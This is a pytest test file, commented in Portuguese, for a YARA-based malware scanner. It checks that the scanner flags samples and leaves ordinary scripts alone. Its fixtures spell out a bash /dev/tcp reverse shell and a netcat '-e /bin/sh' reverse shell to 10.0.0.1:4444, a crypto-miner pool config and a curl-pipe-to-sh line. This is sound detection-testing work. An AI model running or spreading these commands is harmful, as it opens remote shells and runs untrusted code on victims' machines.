import pytest

pytest.importorskip("yara_x")

from guardiao import regras_yara, scanner

# Amostras montadas em pedaços para este arquivo de teste não ser, ele mesmo,
# detectado ao varrer o projeto. Usa join() porque literais adjacentes ("a" "b")
# são unidos pelo compilador e reapareceriam inteiros no .pyc.
REVERSE_SHELL = "".join(["#!/bin/bash\nbash -i >& /dev/", "tcp/10.0.0.1/4444 0>&1\n"])
NETCAT = "".join(["nc 10.0.0.1 4444 -e /bin/", "sh\n"])
MINERADOR = "".join(['{"url": "stratum+', 'tcp://pool.exemplo.com:3333", "user": "carteira"}'])
CURL_SH = "".join(["#!/bin/sh\ncurl -fsSL https://exemplo.com/install.sh |", " sh\n"])


@pytest.fixture(scope="module")
def yara():
    return regras_yara.carregar()


def analisar(tmp_path, nome, conteudo, yara):
    arquivo = tmp_path / nome
    if isinstance(conteudo, bytes):
        arquivo.write_bytes(conteudo)
    else:
        arquivo.write_text(conteudo)
    return scanner.analisar(arquivo, {}, yara)


def test_reverse_shell_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "atualizar.sh", REVERSE_SHELL, yara)
    assert r.ameaca == "ReverseShell_DevTcp (YARA)"


def test_netcat_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "run.sh", NETCAT, yara)
    assert r.ameaca == "ReverseShell_Netcat (YARA)"


def test_minerador_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "config.json", MINERADOR, yara)
    assert r.ameaca == "MineradorCripto (YARA)"


def test_curl_pipe_sh_e_suspeito(tmp_path, yara):
    r = analisar(tmp_path, "setup.sh", CURL_SH, yara)
    assert not r.infectado and r.suspeito
    assert any("DownloadEExecuta" in m for m in r.motivos)


def test_curl_pipe_sh_em_documentacao_nao_e_suspeito(tmp_path, yara):
    # READMEs e manuais ensinam a instalar assim; sem "#!" não é um script.
    texto = "## Instalação\n\n" + CURL_SH.removeprefix("#!/bin/sh\n")
    for nome in ("README.md", "installation.html", "METADATA"):
        assert not analisar(tmp_path, nome, texto, yara).suspeito


def test_elf_upx_e_suspeito(tmp_path, yara):
    r = analisar(tmp_path, "programa", b"\x7fELF" + b"\x00" * 100 + b"UPX!" + b"\x00" * 100, yara)
    assert r.suspeito
    assert any("ELF_EmpacotadoUPX" in m for m in r.motivos)


def test_script_comum_passa_limpo(tmp_path, yara):
    r = analisar(tmp_path, "backup.sh", "#!/bin/bash\ntar czf backup.tgz ~/docs\necho pronto\n", yara)
    assert not r.infectado and not r.suspeito


def test_nao_detecta_as_proprias_regras(yara):
    resultados = list(scanner.varrer(regras_yara.PASTA_PADRAO.parent, {}, yara))
    assert not any(getattr(r, "infectado", False) for r in resultados)



# Regras de mentira, no formato da YARA Forge (score + description em inglês).
REGRAS_DA_BASE = """
rule Comunidade_Malware { meta: score = 85 description = "known family" strings: $a = "MARCA-FAMILIA" condition: $a }
rule Comunidade_Generica { meta: score = 70 description = "generic pattern" strings: $a = "MARCA-GENERICA" condition: $a }
"""


def regras_de_base(pasta, texto):
    arquivo = pasta / "base-teste" / "versoes" / "v1" / "regras.yar"
    arquivo.parent.mkdir(parents=True)
    arquivo.write_text(texto)
    return arquivo


@pytest.fixture
def com_base(tmp_path, monkeypatch):
    def usar(texto):
        arquivo = regras_de_base(tmp_path / "bases", texto)
        monkeypatch.setattr(regras_yara, "regras_das_bases", lambda: [arquivo])
        return regras_yara.carregar()
    return usar


def test_regras_da_base_usam_o_score(tmp_path, com_base):
    yara = com_base(REGRAS_DA_BASE)
    malware = analisar(tmp_path, "a.bin", "xx MARCA-FAMILIA yy", yara)
    generica = analisar(tmp_path, "b.bin", "xx MARCA-GENERICA yy", yara)
    assert malware.infectado and "Comunidade_Malware" in malware.ameaca
    assert not generica.infectado and generica.suspeito
    assert any("generic pattern" in m for m in generica.motivos)


def test_regra_desligada_e_ignorada(tmp_path, com_base, monkeypatch):
    desligadas = tmp_path / "desligadas.txt"
    desligadas.write_text("Comunidade_Malware   # falso positivo num jogo\n")
    monkeypatch.setattr(regras_yara, "DESLIGADAS", desligadas)
    monkeypatch.setattr(regras_yara, "_cache_desligadas", None)
    assert not analisar(tmp_path, "a.bin", "xx MARCA-FAMILIA yy", com_base(REGRAS_DA_BASE)).infectado


def test_base_quebrada_nao_derruba_as_nossas_regras(tmp_path, com_base):
    assert analisar(tmp_path, "atualizar.sh", REVERSE_SHELL, com_base("rule { quebrada")).infectado


def test_validar_fonte(tmp_path):
    assert regras_yara.validar_fonte(regras_de_base(tmp_path / "boa", REGRAS_DA_BASE)) == 2
    with pytest.raises(Exception):
        regras_yara.validar_fonte(regras_de_base(tmp_path / "ruim", "rule { quebrada"))
